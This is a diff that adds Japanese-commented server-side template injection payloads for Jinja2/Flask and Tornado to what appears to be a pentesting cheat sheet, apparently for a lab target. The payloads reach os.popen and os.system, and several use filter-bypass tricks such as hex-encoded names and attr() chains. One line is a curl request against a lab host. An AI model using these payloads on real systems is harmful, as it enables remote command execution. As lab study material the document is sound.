@@ -65,6 +65,37 @@ Flask, Werkzeug が内部的に使用している。
 ```
 
 ```python
+# ドットの使用を回避
+{{ self["__init__"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("id")["read"]() }}
+```
+
+```python
+# 16進エンコード
+{{ self['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('\x69\x64')['\x72\x65\x61\x64']() }}
+```
+
+```sh
+# 16進エンコードする簡単な方法
+python3 -c 's="__init__"; print("".join(f"\\x{ord(c):02x}" for c in s))'
+```
+
+```python
+# アンダースコアを回避した汎用ペイロード
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+```
+
+```sh
+# {{ }} が nested braces になるので、globoff が必要。
+curl --globoff "http://vulnnet.thm:8080/{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}"
+```
+
+```python
+# ブラウザのURLに入力する場合は、バックスラッシュを%5cにする必要がある
+{{request|attr('application')|attr('%5cx5f%5cx5fglobals%5cx5f%5cx5f')|attr('%5cx5f%5cx5fgetitem%5cx5f%5cx5f')('%5cx5f%5cx5fbuiltins%5cx5f%5cx5f')|attr('%5cx5f%5cx5fgetitem%5cx5f%5cx5f')('%5cx5f%5cx5fimport%5cx5f%5cx5f')('os')|attr('popen')('id')|attr('read')()}}
+```
+
+```python
+# Tornado?
 {% import os %}{{ os.system("whoami") }}
 ```
 
